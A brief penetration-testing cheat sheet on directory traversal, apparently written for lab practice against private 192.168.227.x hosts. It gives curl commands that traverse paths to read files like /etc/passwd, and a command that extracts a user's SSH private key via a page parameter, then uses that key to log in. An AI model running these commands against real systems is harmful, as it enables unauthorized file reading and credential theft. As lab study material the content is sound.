---
description: >-
  Directory Traversal is a known web vulnerability which allows the attacker to
  view files on the servers. Attackers can elevate this vulnerability to read
  sensitive files such as SSH keys
---

# Directory Traversal

In case of traversal in URL: `<url>/../../../etc/passwd` use the `--path-as-is` flag:

```bash
curl -i --path-as-is http://192.168.227.193:3000/public/plugins/mysql/../../../../../../../../Users/install.txt  
```

### Stealing SSH Keys

```bash
curl -i http://192.168.227.16/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa | awk '/BEGIN/,/END/'
```

Connect using the SSH key

```bash
# Change premissions
sudo chmod 600 ssh.key
# Connect
ssh 192.168.227.16 -i ssh.key
```
